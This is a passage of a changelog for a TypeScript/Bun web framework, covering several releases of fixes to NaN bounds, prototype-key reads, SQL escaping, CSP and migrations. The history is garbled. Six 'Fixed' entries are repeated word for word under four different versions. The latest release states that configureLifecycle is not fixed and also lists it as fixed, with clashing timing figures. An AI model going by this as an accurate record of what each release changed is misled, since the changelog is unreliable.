  | `@ultimat3/auth` (blind-spot slice) | `randomToken` `byteLength`, `generateRecoveryCodes` `count` (whole ≥ 1) |
  | `@ultimat3/http` | `Route.meta.cache.maxAgeSeconds`, `sMaxAgeSeconds`, `staleWhileRevalidateSeconds` — whole ≥ 0, refused at `createRouter` with `X_CONFIG_INVALID` naming the route and the key. `0` stays legal: it is "revalidate every time", and three framework defaults declare it |
  | `@ultimat3/time` | `toMs(number)` / `toSeconds(number)` — finite only. **Negatives and fractions are unchanged**: `toSeconds(-3000) === -3` is shipped, tested behaviour |

  **What to do:** run your app. Every refusal is at boot or at the call boundary, so one `bun test`
  or one `x verify` surfaces all of them at once and the `fix:` line carries the edit.
- **`MAX_PROXY_HOPS` is exported from `@ultimat3/http`**, and `packages/cli/src/dev-roles.ts`
  imports it instead of restating `64`. The behavioural test comparing the two ceilings is KEPT
  rather than deleted: it compares what each screen accepts, so it still catches the two diverging
  for a reason a shared constant cannot fix — one side gaining a range check the other lacks.
- **`TRUSTED_PROXY_HOPS` now accepts 1–64, widened from 1–16.** Two screens governed one setting
  with two different ceilings: `packages/cli/src/dev-roles.ts` judged the env string and
  `@ultimat3/http` the config number. Both screens are legitimate and stay — an operator who set an
  env var must not get a `fix:` naming a code edit they cannot make — but the *number* was the
  axiom-1 violation. The CLI moved, because widening breaks no shipped configuration while
  tightening `@ultimat3/http` would narrow a public API in an already-released tier. A test probes
  both screens for the highest value each accepts and fails naming both numbers the moment they
  diverge: behaviour compared, not constants.
- **BREAKING — `http.trustedProxyHops` accepts `1…64`.** `0` was the failure state, not a setting:
  `forwarded.ts` returns `undefined` for `hops < 1`, so a declared `0` silently trusted nothing while
  reading as a configured value. It is a boot-owned key, so no app can write it; the blast radius is
  embedders calling `defineHttpConfig` directly. The unreachable `?? 0` beside it is removed rather
  than left as a dead line that reads as a live default.
- **BREAKING — `search().page(input, { first })` serves a window narrower than the read.** It was
  briefly refused outright during this sweep, which was wrong in the one direction that matters: the
  framework's own defaults collide — `limit` defaults to `20` and `first` has no default — so
  `search({…})` + `.page(input, { first: 10 })` was a 500 on page **one** with nothing misdeclared.
  A screen that fires on its own defaults is not a screen. The refusal now fires only when rows
  would actually be **cut**, and names both edits; when the page fits, `hasNextPage` is false by
  construction, so no cursor is minted that a second call is guaranteed to throw on.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **`X_LOCALE_INVALID` was answering 500.** It sat in the never-reaches-a-request backlog on the
  strength of the http `locale` stage never throwing — true of that stage, irrelevant to `?locale=`,
  a path segment, or an action input reaching `formatDate` / `formatMoney` / `describeCron`. Those
  paged the on-call for a string the caller typed. It is `400` now, beside its sibling.
- **`pick` / `omit` returned a schema validating nothing.** `packages/schema/src/validators.ts`
  built the rebuilt shape on a plain `{}`, so a schema declaring a `__proto__` field returned **zero
  properties** — publishing nothing and dropping the field from `parse()` output. Found while
  verifying an unrelated finding; `bun run proto-index` cannot see it, because it is a computed
  **write** rather than a read.
- **`packages/db/src/client.ts` split 510 → 263 lines** across five files. 213 public exports
  before, 213 after, checked against the pre-existing `dist/index.d.ts`.
- **A JSDoc block that had drifted onto the next symbol** in `packages/http/src/rate-limit.ts`, and
  two stacked blocks in `packages/http/src/config.ts` whose rationale was dead text.
- **A `NaN` token estimate did not bypass the AI budget — it POISONED it.** `@ultimat3/ai`'s
  gateway used the pre-flight estimate as its ceiling check and then wrote it onto both the ledger
  and the per-process `BudgetStore`. Measured: a `NaN` estimate passed a 1,000-token ceiling, and
  every later call was then compared against a poisoned total, so a **5,000,000-token call passed
  the same ceiling**. Screened at the seam every model call crosses, and at each declaration under
  the key name the declaration itself uses — a bound reported under the framework's internal name
  sends the reader to a key their app never wrote.
- **`chunk({ size })` and `embedBatched` were a synchronous infinite loop**, past every
  `AbortSignal`, past the job timeout, on the worker's only thread. Both are now pinned by tests
  that HANG when the screen is removed — the runner has to be killed, which is the honest shape of
  that assertion.
- **An ISR page with a non-finite TTL was never fresh, so it regenerated on EVERY request.**
  `render-isr`'s freshness test is `now - generatedAt < ttlMs`, false for a `NaN` ttl, and the entry
  comes from a **pluggable** `IsrStore`. Silent unbounded origin load, on top of the `s-maxage=NaN`
  it also emitted. Repaired totally rather than by throwing: a ttl that is not positive-finite
  becomes the tag-only `null`, with an `isr.entry_ttl_invalid` warning.
- **`cache-control` emitted `max-age=NaN`**, which is not a shorter age — it is an unparseable
  directive a conforming cache **ignores**, so the response fell back to heuristic caching rather
  than to the declared age. `finiteDeltaSeconds` drops a field that is not RFC-9111 delta-seconds;
  every fallback goes the SHORTER direction, so nothing can lengthen an age the caller did not ask
  for. Total, never a throw — this is the response path. The boot-time half, screening `Route.cache`
  at registration, is issue #373.
- **A `NaN` `precache` entry took down the budget warning for every OTHER entry** — one bad entry
  makes the total `NaN`, and `NaN > warnBytes` is false. Reproduced: an `Infinity` entry printed
  `precache is 0b (over 1b)`.
- **`retentionPlan` evicted every deploy, including the running one**, for a non-finite `keep`:
  `Math.max(1, NaN)` is `NaN` and `slice(0, NaN)` is `[]`.
- **The MCP query cap answered an empty table as a complete answer.** `capQueryRows` with a
  non-finite ceiling gives the agent **zero rows with `truncated: false`**, and switches the 256 KiB
  context guard off entirely.
- **A `NaN` scrape timeout was a busy-loop against a real browser.** Measured with the screens
  removed: `awaitActionable({ timeoutMs: NaN })` ran **835,462 polls in 3 seconds — 278,487/s** and
  was still looping, each one a CDP round trip, past `ctx.signal`, past the wedge watchdog and past
  the job timeout. `for (;;)` with a `NaN` budget has no exit.
- **A saved scrape session with an unparseable `savedAt` was restored at any age.** The stored value
  is only checked to *be a string*, so an edited fixture gave `age = NaN` and `age > maxAge` is
  false. The comparison is now written fail-closed — `!(age <= limit)` — which is identical for
  every finite age and opposite for `NaN`.
- **`installDeterminism({ now: 'yesterday' })` broke `Date.now()` for the WHOLE test process.**
  `bun test` is one process and the preload installs the clock globally, so an unparseable `now`
  made `Date.now()` answer `NaN` and `new Date()` answer `Invalid Date` in every test file, with no
  later `advanceClock` or `setFrozenClock` able to undo it.
- **A `NaN` seed did not break determinism — it silently made the run the SEED-ZERO run.** Measured:
  `seed >>> 0` maps `NaN`, `±Infinity`, `0.5`, `-1` and `2**32` all to the identical sequence as
  `seed: 0`. So the run reproduced fine and the *record of which seed produced it* was false, in the
  package whose whole promise is reproducibility.
- **`configureLifecycle` is NOT fixed here and is tracked in #371.** A `NaN` `deadlineMs` makes a
  deploy drop in-flight requests and abandon shutdown hooks on the first tick — reproduced:
  `drain()` returned in 111 ms with work still in flight. It is an `!== undefined` assignment rather
  than a `??` default, so the ratchet cannot see it, which means `packages/core`'s absence from the
  pin table currently claims more than it has proved.
- **`x dev` held every span of every request forever** for a non-finite trace limit —
  `while (byTrace.size > NaN)` never runs, so the eviction loop stops existing.
- **`randomToken(NaN)` was the empty string** — the framework's secret generator, returning no
  secret and reporting success. `nanoid` and `randomHex` did the same, and `randomHex` is what
  `traceId()`, `spanId()` and `uuid()` mint from. A negative length threw a bare, uncoded
  `RangeError`. All are bare **parameter defaults**, so `??` never applied and the ratchet could not
  see them.
- **`generateRecoveryCodes(Infinity)` wedged the process**, synchronously, on the enrolment path,
  from a public export — `for (index = 0; index < Infinity; …)` has no exit. `NaN` enrolled a user
  with **zero** recovery codes in a well-formed `RecoveryCodeSet`, and `2.5` silently gave three.
  The second hang in `@ultimat3/auth` after `mfa.drift`, and now closed.
- **`configureLifecycle({ deadlineMs: NaN })` made a deploy abandon its own shutdown.** In-flight
  requests dropped and close hooks **ABANDONED on the first tick** — measured, `drain()` returned in
  16 ms with `inflight` still 1, and Bun printed `TimeoutNaNWarning`. It emitted
  `X_SHUTDOWN_TIMEOUT` saying `after NaNms` with a `fix:` telling the operator to *raise the
  budget*, which cannot help when the value is not a budget. **`packages/cli/src/hold.ts` carried
  the identical defect and is fixed transitively** — a reader of that file will see no diff. The
  message text is deliberately unchanged: with the bound screened, `NaNms` is unreachable, so a
  branch for it would be a test that cannot fail.
- **A route's `cache` hint was only caught on the response path**, once per request, forever. It is
  now refused where it is **declared**, at `createRouter`, naming the route file and the key — the
  layered form the whole sweep uses: refuse where the value is written, be total where it is used.
- **`@ultimat3/time`'s `toMs` passed a non-finite number straight through**, so `time` and `notify`
  gave **opposite answers** to the same input after the tier-4 slice screened the copy and not the
  original.
- **`syncAuthenticator({ ttlMs: NaN })` reopened the hole that file exists to close.** `expiresAt =
  now + NaN` is `NaN` and `expired()` asks `expiresAt <= now`, false forever. Measured: session
  revoked, clock advanced a **full year**, `sweepGrants` answered `{refreshed: 0, revoked: 0,
  failed: 0}`, and the book still held the socket.

### Removed

- **`packages/time/src/locale.ts`** — unimported; the eleven hits for `'./locale'` are all
  `packages/http/src/locale.ts`, a different file.
- **`SQL_OUTBOX_TABLE`** from the `@ultimat3/jobs` barrel. It was a byte-for-byte second copy of the
  statements `SQL_JOBS_TABLE` already creates, so `x_outbox` was declared twice and created once.

### Commits

- fix(core,auth,http,time): randomToken(NaN) was the empty string, and a deploy abandoned its own shutdown (#377)
- fix(tier 5): 835,462 polls in three seconds, and a session that never expired (#375)
- fix(tier 4): a NaN estimate did not bypass the AI budget, it poisoned it (#374)
- fix(tier 2–3): at-least-once became never when a lease bound was NaN (#370)
- fix(tier 0–1): a bound whose own NaN makes its guard read false (#364)
- test(scripts): two ratchets for tests that cannot fail, and the 24 sites they found (#360)

## 16.0.0 - 2026-08-26

### Added

- **`invariant()` can express a pattern that reaches the database**, and the existing spelling was
  the defect. `c.slug.matches(/re/)` already emitted `slug ~ '…'` — what it did not do was check
  that the two engines READ that string the same way, so `matches(/\bfoo/)` shipped a CHECK that
  compiled cleanly, errored nowhere, and enforced a **backspace**: Postgres reads `\b` as `BACKSPACE`
  and `'foo' ~ '\bfoo'` is FALSE. Nothing is translated — `pattern.source` is the string `.test()`
  runs *and* the string spliced into the constraint — and every construct where the two disagree is
  now **refused at declaration** with the portable spelling in the `fix:`. Measured against a live
  server, one shape at a time: `\b`, `.`, `\w`, `\s`, `\A`/`\Z`, backreferences, named groups,
  inline flags, POSIX classes, a leading `]` in a class, `\x`, and a non-ASCII range endpoint.
- **BREAKING — `c.<col>.matches(/re/)` refuses a construct the two regex engines read differently.**
  It previously accepted any `RegExp` and emitted a maybe-equivalent POSIX pattern, so
  `matches(/\bfoo/)` shipped a CHECK that compiled cleanly, errored nowhere, and enforced a
  BACKSPACE. A pattern outside the portable subset now throws `X_INVARIANT_VIOLATED` at `entity()`
  time, naming the construct, its index, both readings, and either the portable spelling or the
  app-only predicate form.

  **What to do:** run your entities. Every refusal is at declaration, so a `bun test` or a `x db
  gen` surfaces all of them at once; the `fix:` line carries the edit. An app whose patterns are
  already inside the subset compiles and emits exactly what it emitted before. Apps that were
  refused were not working — they had two rules under one name and no way to notice.
- **`iff(a, b)`, `isNull()` and `isNotNull()`** — the vocabulary a cross-column coherence rule
  needed. `iff(c.status.eq('published'), c.publishedAt.isNotNull())` renders
  `(status = 'published') = (published_at is not null)`.

  `=` and deliberately **not** `IS NOT DISTINCT FROM`, which is the total form and measurably the
  wrong one: every operator in this language is *false* on a null operand in TS, so with a partial
  operand the total form makes Postgres **refuse a row TypeScript accepted** — a raw `23514` in
  place of `X_INVARIANT_VIOLATED`. `=` keeps the disagreement in the direction where the app refuses
  first. One combinator, not a boolean algebra: `and`/`or`/`not` arrive with a real caller or not at
  all.
- **`bun run sql-literal-copies`** — a step of the gate's `unit` check. One module may turn `'` into
  `''`, matched on the transformation rather than on a name. Pinned at zero.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **`x db gen` never dropped an index an entity stopped declaring.** `diffTable`'s index loop
  walked DECLARED indexes only and matched by name, so a recorded index no entity declares stayed
  on the database forever while the next sidecar quietly stopped recording it. `checkPlan` has that
  arm and `foreignKeyPlan` gained it in 2026-08; the index arm never did.

  Measured on `examples/dummy`: the chain created `member_unique_per_org`, `members_tz_idx` and
  `post_slug_unique_per_org`, dropped none, and the newest sidecar recorded none. `declaredSchema`
  reads only that sidecar and calls it the database, so the **next** `x db gen` was blind to all
  three — and `drift` was green over it, because drift judges the declared side.
  `post_slug_unique_per_org` matters most: its replacement is **narrower**, `(slug)` against
  `(org_id, slug)`.

  Dropping one is not one statement. A recorded unique CONSTRAINT and a plain unique INDEX are
  indistinguishable in `TableDescription`, and the *same declaration* reaches the server as either
  kind depending on which migration created it. Measured on 18.4: `drop index` on a
  constraint-backed index is `2BP01`, and **`if exists` does not suppress it** — so the emitted
  repair is a guarded pair, constraint first, and only for the shape a constraint's index can have.
- **A materialised view's `fix:` line emitted DDL Postgres refuses.** `dependentViews` selects
  `relkind in ('v', 'm')` deliberately, while `restoreView` always wrote `drop view` — answered
  with `WRONG_OBJECT_TYPE`. The one kind the query went out of its way to include was the one whose
  fix could not run.
- **An app's declared column default could be stored as a different value, silently.**
  `.default('C:\logs')` emitted `default 'C:\logs'`, which stores `C:\logs` with
  `standard_conforming_strings` on and **`C:logs`** with it off — a GUC settable per session, per
  database and per role, needing no privilege. A declaration that type-checks, a migration that
  applies, a column defaulting to a value nobody wrote, and no error anywhere. A value *ending* in a
  backslash was worse: the escaped quote left the literal unterminated.

  Three copies of the escape existed and **two stopped at doubling the quote**. `literal()` in
  `@ultimat3/db` is now the one answer and emits `E'…'` **only** when the value carries a backslash,
  so every migration already on disk is byte-identical and nothing regenerates.
- **A foreign key over a retyped column aborted the migration.** `42804`, thrown by the ALTER
  itself, inside `ROLE=migrate`, with the ledger recording nothing. It could not be answered from
  inside `diffTable`: the constraint that breaks is recorded on the table that *owns* it, so for a
  retype of the key's target it is a different entity's row. The retype set is now derived over the
  whole schema before the entity loop, and `retypeColumn` reads it instead of deciding again.
- **A view over a retyped column reached the operator as `X_DB_UNAVAILABLE`** — "cannot reach the
  database", on a database the migrator was connected to and mid-transaction on, while the server's
  own `rule _RETURN on view … depends on column` sat unread in a `DETAIL` field.
  `X_MIGRATION_VIEW_DEPENDS` names the view, the table and the column, caught by a preflight inside
  the migration's own transaction so nothing partial applies. A refusal, not a repair: no
  `SchemaDescription` records a view and no `entity()` can declare one.
- **A generated column's rebuild silently dropped a partial index and a CHECK naming it.**
  Plain → generated has no `set expression`, so the column is dropped and re-added — and
  `drop column` takes both with it, while the snapshot went on recording them.
- **`sqlType` answered the `Object` function for the kind `constructor`** and spliced its source
  into the type position of an `alter` statement.

### Changed

- **`examples/dummy` regenerates its migrations, for the first time.** Its `drift` step is green
  and unpinned — 17/20 to **18/20** on the app ratchet. `REPLICA IDENTITY FULL` turned out not to
  be the blocker its pin claimed: that measurement was taken against a **squash**, and the
  incremental path keeps `0001_init.sql` and both `ALTER`s. What it needed was the
  `-- ungeneratable: 7` header the error's own `fix:` line asked for. Still a real gap for a NEW
  app, tracked as #357.
- **Both tracked apps now render every invariant.** `examples/dummy` and
  `dummy/social-media-clone` had **five** rules between them declared as JS predicates, so each
  reported `sql: null` and reached no database — while three source comments claimed a Postgres
  CHECK was enforced "from one declaration". `dummy/social-media-clone`'s `users` table has had no
  handle constraint at all, and `friendships` none on its responded-coherence rule.

  `examples/dummy`'s `member_email_shape` was the subtle one: it declared `contains('@')`, which
  renders `position('@' in email) > 0` — weaker than the `> 1` the hand-written migration has
  enforced since day one, so regenerating on that form would have *introduced* a regression.

### Commits

- fix(db): drop the index an entity stopped declaring, so the reference app can regenerate (#358)
- fix(db,entity): a pattern that reaches the database, a literal that survives the GUC, and a retype that no longer aborts (#356)

## 15.0.0 - 2026-08-25

The four items 14.0.0 left open, closed — and one deliberately left open, with the reason.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **A retype aborted whenever a predicate named the column.** `alter column … type` failed
  `42883` when a partial index's `where` or a CHECK named it: both were compiled against the old
  type and cannot be recompiled. **`examples/dummy` could not regenerate at all**, aborting at
  statement 68 of 85; it now applies 86 statements clean and reverses in 66, measured on a
  populated database.

  The dependency set was larger than reported. Measured on PG 18.4, one shape at a time: a plain
  btree, a composite btree and a unique index all **survive** the ALTER; a partial index naming the
  column and a CHECK naming it are both `42883`. A **foreign key** over the column and a **view**
  are fatal too — measured, not fixed, written into `packages/db/CLAUDE.md`.

  The reference scan **over-approximates deliberately**: narrowing by type name was tried and
  rejected with data — `char(1)→char(3)`, `varchar(80)→text` and `numeric→integer` all re-derive
  their predicates, but `integer→text` under `check (c >= 0)` does not, all built-ins. Whether an
  expression re-resolves is *operator resolution*, so a miss is `42883` inside `ROLE=migrate` and a
  false positive is a rebuild on a statement already rewriting the whole table.
- **Two byte allowances were stale, and flaky only under load.** The module Bun's tree-shaker drops
  non-deterministically grew from 379 B to ~1,124 B when `schema-error-codes.ts` gained
  `registerErrorRetry`. The drop is load-correlated — 0 in 80 idle builds, 22 in 240 under six-way
  contention — which is why CI failed and a laptop never did. Both tests now discriminate on the
  module itself: **51 bytes of planted real source made the minified chunk 47 bytes SMALLER**, so
  the old `<= 512` bound could not catch a regression in either direction.

  **The root cause is upstream and the fix is a workaround.** `@ultimat3/core` *declares* that
  module in `sideEffects` and `bun run side-effects` agrees the declaration is true, so Bun 1.4.0
  is dropping a module its own package marks side-effecting — the family of `oven-sh/bun#27709`,
  open. Recorded in both files so nobody tidies it back into a threshold.
- **A compiled module imported a specifier it could not resolve.** `JSX_PRELUDE` emitted a bare
  `'@ultimat3/render'`, so any `.tsx` outside the repo failed — invisible to the gate because
  `bun test --isolate` gives each file its own module registry. Bun 1.4.0's **runtime** plugin does
  not support `onResolve` (three registrations, none fires), so the specifier is resolved in the
  loader's frame. Nothing persists that output: islands are built by a separate `Bun.build`.
- **The app gate reported a shard's exit code and nothing else.** `packages/cli` already carried the
  failing test's name and assertion diff through `--json`; `scripts/reference-app-gate.ts` dropped
  it in three places. An unpinned red step now prints it and a pinned one stays quiet. That absence
  is why one flaky shard cost a clean-checkout reproduction and 300 instrumented builds.

### Changed

- **BREAKING — `DriftKind` gains `missing-check`.** A `switch` over `DriftKind` with no `default`
  no longer compiles, the same shape 4.0.0 recorded for `changed-foreign-key`. It compares
  `conname` and **never** the definition: `pg_get_constraintdef` answers Postgres' own rewriting, so
  a text comparison would report a correct database forever. `checks` (declaration) and
  `checkNames` (catalog) are two fields, and `CheckRow` has no definition column, so merging them
  requires visibly adding one.

### Known

- **The reference app is deliberately NOT regenerated.** `x db gen` reports three `-- UNRENDERED`
  entries and would drop three real CHECKs. `invariant()` has **no SQL-expressible pattern form** —
  `matches` takes a JS `RegExp` and yields `sql: null` — so a regex constraint can only be
  hand-written and only be lost. The guard is correct; the gap is the framework's, and it is
  recorded in that app's schema file.

### Commits

- fix: a retype that aborted, a drift that could not see, and two stale byte allowances (#353)

## 14.0.0 - 2026-08-25

The gaps 13.0.0 left, closed — and the three packages that release never opened, audited.

### Added

- **A real e2e browser driver.** `hasE2eDriver()` had answered `false` since it was written; no
  driver had ever existed. `installE2eDriver()` in `@ultimat3/cli` adapts a live `ScrapePage` to
  `PageLike` — `goto`, `reload`, `title`, `url`, `gotoStreamed`, `waitForServiceWorker`,
  `evaluate`, `locator`, `getByRole`, `getByText` and every `LocatorLike` method, driving the
  retrying `toBeVisible` matcher unchanged. `cli` is the composition point because it already holds
  declared tier edges to **both** `testing` and `scraping`; a `testing → scraping` edge would have
  been a new sideways exception.
- `ScrapeFrame.query(selector)` and `ScrapePage.offline(enabled)`, so a frame read and a browser's
  offline mode are drivable rather than approximated.
- `resetE2eDriver()` — `useE2eDriver` shipped with no inverse and wrote process-global module
  scope, so `packages/testing`'s own test file leaked a driver into every later file in a run.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

